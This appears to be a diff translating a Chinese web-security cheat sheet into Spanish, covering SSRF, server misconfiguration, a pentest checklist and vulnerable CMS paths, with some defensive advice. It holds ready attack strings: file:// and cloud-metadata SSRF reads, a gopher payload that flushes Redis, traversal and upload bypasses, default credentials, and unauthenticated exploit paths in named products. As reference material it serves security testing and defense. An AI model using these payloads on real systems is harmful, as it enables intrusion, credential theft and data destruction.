@@ -1,191 +1,191 @@
-# Web 安全 - SSRF、服务器配置错误、综合 Checklist
+# Seguridad Web - SSRF, errores de configuración de servidor, Checklist integral
 
-> 来源: WooYun 漏洞库 | 拆自 web-file-infra.md（SSRF + 配置错误 + Checklist + CMS/URL 附录）
+> Fuente: Base de datos de vulnerabilidades WooYun | Extraído de web-file-infra.md (SSRF + errores de configuración + Checklist + anexos de CMS/URL)
 
-## 四、SSRF与协议利用
+## IV. SSRF y explotación de protocolos
 
-### 4.1 漏洞本质
+### 4.1 Naturaleza de la vulnerabilidad
 
 ```
-SSRF本质: 服务端代为发起请求,攻击者控制请求目标
-风险: 内网探测 -> 内部服务访问 -> 文件读取 -> 命令执行
+Naturaleza del SSRF: el servidor realiza la petición en nombre del atacante, quien controla el destino de la petición
+Riesgo: sondeo de red interna -> acceso a servicios internos -> lectura de archivos -> ejecución de comandos
 ```
 
-### 4.2 常见触发点
+### 4.2 Puntos de activación comunes
 
-- 文件下载功能中的url参数
-- 图片加载/代理功能
-- 网页预览/截图功能
-- 导入URL功能
-- Webhook/回调配置
+- Parámetro url en funciones de descarga de archivos
+- Funciones de carga/proxy de imágenes
+- Funciones de vista previa de páginas web/captura de pantalla
+- Función de importación por URL
+- Configuración de Webhook/callback
 
-### 4.3 协议利用
+### 4.3 Explotación de protocolos
 
 ```bash
-# file:// - 任意文件读取
+# file:// - Lectura de archivos arbitraria
 file:///etc/passwd
 file:///C:/windows/win.ini
 
-# dict:// - 端口探测/服务交互
+# dict:// - Sondeo de puertos/interacción con servicios
 dict://127.0.0.1:6379/info     # Redis
 dict://127.0.0.1:11211/stats   # Memcached
 
-# gopher:// - 构造任意TCP请求
+# gopher:// - Construcción de peticiones TCP arbitrarias
 gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall
 
-# http:// - 内网探测
+# http:// - Sondeo de red interna
 http://127.0.0.1:8080
-http://169.254.169.254/latest/meta-data/  # 云元数据
+http://169.254.169.254/latest/meta-data/  # Metadatos de la nube
 ```
 
-### 4.4 绕过技巧
+### 4.4 Técnicas de bypass
 
 ```bash
-# IP变形绕过
+# Bypass mediante variantes de IP
 127.0.0.1 -> 0x7f000001 -> 2130706433 -> 017700000001 -> 127.1
-# DNS重绑定: 解析到外部IP再快速切换到127.0.0.1
-# 短链接/302跳转: 通过外部URL跳转到内网地址
+# DNS rebinding: resolver a una IP externa y luego cambiar rápidamente a 127.0.0.1
+# Enlaces cortos/redirección 302: saltar a una dirección interna a través de una URL externa
 ```
 
-### 4.5 防御措施
+### 4.5 Medidas de defensa
 
-1. 白名单限制: 限制请求目标域名/IP
-2. 协议限制: 仅允许http/https
-3. 内网隔离: 禁止请求RFC1918地址和127.0.0.1
-4. DNS解析验证: 解析后再次校验IP归属
-5. 禁用重定向: 或限制重定向次数并再次校验
+1. Restricción por lista blanca: limitar el dominio/IP de destino de la petición
+2. Restricción de protocolo: permitir solo http/https
+3. Aislamiento de red interna: prohibir peticiones a direcciones RFC1918 y 127.0.0.1
+4. Validación de resolución DNS: verificar de nuevo la pertenencia de la IP tras la resolución
+5. Deshabilitar redirecciones: o limitar el número de redirecciones y volver a validar
 
 ---
 
-## 五、服务器配置错误
+## V. Errores de configuración del servidor
 
-### 5.1 解析配置错误
+### 5.1 Errores de configuración de análisis (parsing)
 
-| 问题 | 风险 | 检查方法 |
+| Problema | Riesgo | Método de verificación |
 |-----|------|---------|
-| IIS 6.0解析漏洞未修复 | `shell.asp;.jpg`可执行 | 上传含分号文件名测试 |
-| Nginx cgi.fix_pathinfo=1 | `/img.jpg/.php`解析为PHP | 上传图片访问`/img.jpg/x.php` |
-| Apache多后缀解析 | `shell.php.xxx`被解析 | 上传双扩展名文件测试 |
-| 上传目录可执行脚本 | Webshell直接运行 | 上传脚本文件测试 |
-| 目录列表开启 | 暴露所有文件 | 访问目录URL查看 |
+| Vulnerabilidad de parsing de IIS 6.0 sin corregir | `shell.asp;.jpg` se ejecuta | Probar con subida de archivo con punto y coma en el nombre |
+| Nginx cgi.fix_pathinfo=1 | `/img.jpg/.php` se interpreta como PHP | Subir imagen y acceder a `/img.jpg/x.php` |
+| Análisis de múltiples extensiones en Apache | `shell.php.xxx` se interpreta | Probar con subida de archivo de doble extensión |
+| Scripts ejecutables en directorio de subida | Webshell se ejecuta directamente | Probar con subida de archivo de script |
+| Listado de directorios habilitado | Expone todos los archivos | Acceder a la URL del directorio para verificar |
 
-### 5.2 权限配置错误
+### 5.2 Errores de configuración de permisos
 
-| 问题 | 风险 | 修复 |
+| Problema | Riesgo | Corrección |
 |-----|------|------|
-| Web进程高权限运行 | 提权后直接root | 使用低权限用户运行 |
-| 上传目录777权限 | 任意写入+执行 | 设置644/755 |
-| 配置文件可读 | 凭证泄露 | 移出Web目录,限制权限 |
-| 管理后台无IP限制 | 公网可访问 | IP白名单/VPN |
+| Proceso Web ejecutándose con privilegios altos | Escalada de privilegios directa a root | Ejecutar con usuario de bajos privilegios |
+| Directorio de subida con permisos 777 | Escritura y ejecución arbitrarias | Establecer 644/755 |
+| Archivo de configuración legible | Filtración de credenciales | Sacarlo del directorio Web, restringir permisos |
+| Panel de administración sin restricción de IP | Accesible desde internet | Lista blanca de IP/VPN |
 
-### 5.3 默认配置风险
+### 5.3 Riesgos de configuración por defecto
 
 ```bash
-# 默认管理后台路径
+# Rutas de panel de administración por defecto
 /admin/ | /manager/ | /console/ | /system/
 /phpmyadmin/ | /adminer.php
 
-# 默认凭证 (高频)
+# Credenciales por defecto (alta frecuencia)
 admin/admin | admin/123456 | admin/admin123
 root/root | test/test
 
-# 默认调试端口
-8080 (Tomcat) | 9090 (管理) | 3306 (MySQL外网)
-6379 (Redis无密码) | 27017 (MongoDB无认证)
+# Puertos de depuración por defecto
+8080 (Tomcat) | 9090 (administración) | 3306 (MySQL expuesto a internet)
+6379 (Redis sin contraseña) | 27017 (MongoDB sin autenticación)
 ```
 
-### 5.4 Spring Boot Actuator泄露
+### 5.4 Filtración de Spring Boot Actuator
 
 ```bash
-/actuator/env          # 环境变量(含密码)
-/actuator/configprops  # 配置属性
-/actuator/heapdump     # 堆内存转储(含敏感数据)
-/actuator/mappings     # 所有URL映射
+/actuator/env          # Variables de entorno (incluye contraseñas)
+/actuator/configprops  # Propiedades de configuración
+/actuator/heapdump     # Volcado de memoria heap (incluye datos sensibles)
+/actuator/mappings     # Todos los mapeos de URL
 ```
 
 ---
 
-## 六、综合实战Checklist
+## VI. Checklist integral práctico
 
-### 6.1 文件上传测试
+### 6.1 Pruebas de subida de archivos
 
-- [ ] 扫描常见编辑器路径(FCKeditor/eWebEditor/UEditor)
-- [ ] 禁用JavaScript测试前端验证
-- [ ] 测试扩展名绕过: 大小写/双写/特殊后缀/%00截断/分号截断
-- [ ] 修改Content-Type为image/jpeg
-- [ ] 添加GIF89a文件头 / 制作图片马
-- [ ] 识别服务器类型,测试对应解析漏洞
-- [ ] 测试.htaccess/.user.ini上传劫持解析
-- [ ] 分析文件命名规则,测试路径爆破
-- [ ] 测试竞争条件上传
+- [ ] Escanear rutas comunes de editores (FCKeditor/eWebEditor/UEditor)
+- [ ] Deshabilitar JavaScript para probar la validación del lado del cliente
+- [ ] Probar bypass de extensión: mayúsculas/minúsculas/doble escritura/sufijos especiales/truncamiento %00/truncamiento con punto y coma
+- [ ] Modificar el Content-Type a image/jpeg
+- [ ] Agregar cabecera de archivo GIF89a / crear una imagen troyanizada
+- [ ] Identificar el tipo de servidor y probar la vulnerabilidad de parsing correspondiente
+- [ ] Probar el secuestro de parsing mediante subida de .htaccess/.user.ini
+- [ ] Analizar las reglas de nomenclatura de archivos, probar fuerza bruta de rutas
+- [ ] Probar subida mediante condición de carrera
 
-### 6.2 文件遍历测试
+### 6.2 Pruebas de traversal de archivos
 
-- [ ] 识别文件相关参数(filename/path/file/url/download)
-- [ ] 基础遍历: `../../../../../etc/passwd`
-- [ ] Windows测试: `..\..\..\..\..\windows\win.ini`
+- [ ] Identificar parámetros relacionados con archivos (filename/path/file/url/download)
+- [ ] Traversal básico: `../../../../../etc/passwd`
+- [ ] Prueba en Windows: `..\..\..\..\..\windows\win.ini`
 - [ ] Java Web: `../WEB-INF/web.xml`
-- [ ] URL编码绕过: `%2e%2e%2f` / 双重编码 `%252e%252e%252f`
-- [ ] Unicode绕过: `%c0%ae%c0%ae/`
-- [ ] 空字节截断: `../etc/passwd%00.jpg`
-- [ ] 绝对路径: `/etc/passwd` / `file:///etc/passwd`
+- [ ] Bypass mediante codificación URL: `%2e%2e%2f` / doble codificación `%252e%252e%252f`
+- [ ] Bypass mediante Unicode: `%c0%ae%c0%ae/`
+- [ ] Truncamiento con byte nulo: `../etc/passwd%00.jpg`
+- [ ] Ruta absoluta: `/etc/passwd` / `file:///etc/passwd`
 
-### 6.3 信息泄露扫描
+### 6.3 Escaneo de filtración de información
 
-- [ ] 版本控制: `/.git/config` `/.svn/entries` `/.svn/wc.db`
-- [ ] 备份文件: `/wwwroot.rar` `/www.zip` `/backup.sql` `/{domain}.zip`
-- [ ] 配置备份: `/config.php.bak` `/web.config.bak` `/.env.bak`
-- [ ] 环境文件: `/.env` `/.env.production`
-- [ ] 探针文件: `/phpinfo.php` `/info.php` `/test.php`
-- [ ] 日志文件: `/ctp.log` `/debug.log` `/storage/logs/`
-- [ ] 管理界面: `/phpmyadmin/` `/adminer.php` `/swagger-ui.html`
+- [ ] Control de versiones: `/.git/config` `/.svn/entries` `/.svn/wc.db`
+- [ ] Archivos de respaldo: `/wwwroot.rar` `/www.zip` `/backup.sql` `/{domain}.zip`
+- [ ] Respaldos de configuración: `/config.php.bak` `/web.config.bak` `/.env.bak`
+- [ ] Archivos de entorno: `/.env` `/.env.production`
+- [ ] Archivos de prueba: `/phpinfo.php` `/info.php` `/test.php`
+- [ ] Archivos de registro (log): `/ctp.log` `/debug.log` `/storage/logs/`
+- [ ] Interfaces de administración: `/phpmyadmin/` `/adminer.php` `/swagger-ui.html`
 - [ ] Spring Boot: `/actuator/env` `/actuator/heapdump`
-- [ ] Google Hacking语法辅助搜索
+- [ ] Búsqueda asistida con sintaxis de Google Hacking
 
-### 6.4 SSRF测试
+### 6.4 Pruebas de SSRF
 
-- [ ] 识别URL/代理/回调参数
-- [ ] 测试file:///etc/passwd协议读取
-- [ ] 测试内网地址: http://127.0.0.1:port
-- [ ] 云元数据: http://169.254.169.254/latest/meta-data/
-- [ ] IP变形绕过: 十六进制/十进制/省略写法
-- [ ] DNS重绑定/302跳转绕过
+- [ ] Identificar parámetros de URL/proxy/callback
+- [ ] Probar lectura mediante protocolo file:///etc/passwd
+- [ ] Probar direcciones de red interna: http://127.0.0.1:port
+- [ ] Metadatos de la nube: http://169.254.169.254/latest/meta-data/
+- [ ] Bypass mediante variantes de IP: hexadecimal/decimal/notación abreviada
+- [ ] Bypass mediante DNS rebinding/redirección 302
 
 ---
 
-## 附录A: 高危CMS漏洞速查
+## Anexo A: Referencia rápida de vulnerabilidades de CMS de alto riesgo
 
-| CMS/系统 | 漏洞类型 | 路径 | 条件 |
+| CMS/Sistema | Tipo de vulnerabilidad | Ruta | Condición |
 |---------|---------|------|------|
-| 万户OA ezOffice | 任意上传 | `/defaultroot/dragpage/upload.jsp` | %00截断 |
-| 用友协作平台 | 任意上传 | `/oaerp/ui/sync/excelUpload.jsp` | 绕JS+爆破文件名 |
-| 金蝶GSiS | 任意上传 | `/kdgs/core/upload/upload.jsp` | 注册用户 |
-| 金智教育epstar | 文件遍历 | `/epstar/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml` | 无需认证 |
-| 致远OA | 日志泄露 | `/ctp.log` | 直接访问 |
+| Wanhu OA ezOffice | Subida arbitraria | `/defaultroot/dragpage/upload.jsp` | Truncamiento %00 |
+| Plataforma colaborativa Yonyou | Subida arbitraria | `/oaerp/ui/sync/excelUpload.jsp` | Evasión de JS + fuerza bruta de nombre de archivo |
+| Kingdee GSiS | Subida arbitraria | `/kdgs/core/upload/upload.jsp` | Usuario registrado |
+| Jinzhi Education epstar | Traversal de archivos | `/epstar/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml` | Sin necesidad de autenticación |
+| Zhiyuan OA | Filtración de logs | `/ctp.log` | Acceso directo |
 
 
-## 附录C: 通用漏洞URL模式
+## Anexo C: Patrones de URL de vulnerabilidades comunes
 
 ```bash
-# PHP文件遍历
+# Traversal de archivos en PHP
 /down.php?filename=../../../etc/passwd
-/pic.php?url=[base64编码路径]
+/pic.php?url=[ruta codificada en base64]
 
-# JSP文件遍历
+# Traversal de archivos en JSP
 /download.jsp?path=../WEB-INF/web.xml
 /servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml
 
-# ASP/ASPX文件遍历
+# Traversal de archivos en ASP/ASPX
 /DownLoad.aspx?Accessory=../web.config
 /download.ashx?file=../../../web.config
 
-# Resin特有
+# Específico de Resin
 /resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd
 ```
 
 ---
 
-> **供应链/云部署/框架CVE** → 已迁移至 [web-deployment-security.md](web-deployment-security.md)
-> **CORS/GraphQL/HTTP走私/WebSocket/OAuth** → 已迁移至 [web-modern-protocols.md](web-modern-protocols.md)
+> **Cadena de suministro/despliegue en la nube/CVE de frameworks** → migrado a [web-deployment-security.md](web-deployment-security.md)
+> **CORS/GraphQL/HTTP smuggling/WebSocket/OAuth** → migrado a [web-modern-protocols.md](web-modern-protocols.md)
 
-*基于WooYun漏洞库(88,636条)提炼 | 仅供安全研究与防御参考*
+*Elaborado a partir de la base de datos de vulnerabilidades WooYun (88,636 registros) | Solo para fines de investigación y defensa de seguridad*
